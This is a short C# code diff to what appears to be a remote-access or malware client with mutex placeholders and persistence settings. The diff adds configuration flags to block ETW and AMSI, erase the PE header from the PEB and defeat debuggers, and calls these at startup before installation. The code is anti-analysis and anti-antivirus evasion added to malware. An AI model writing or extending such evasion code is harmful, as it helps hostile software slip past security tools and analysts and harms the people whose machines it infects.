@@ -29,6 +29,10 @@ namespace Client
         public static string mutex = "%MUTEX%";
         public static Offline.Persistence.Method installationMethod = Offline.Persistence.Method.NONE;
         public static string[] installationParam = new string[] { AppDomain.CurrentDomain.FriendlyName };
+        public static bool blockETW = false;
+        public static bool blockAMSI = false;
+        public static bool erasePEFromPEB = false;
+        public static bool antiDBG = false;
     }
     public class StarterClass
     {
@@ -111,6 +115,7 @@ namespace Client
         [MTAThread]
         public static void Main()
         {
+            Offline.Special.Parser.Parse(Config.blockAMSI, Config.blockETW, Config.erasePEFromPEB, Config.antiDBG);
             MakeInstall();
             OneInstance();
 
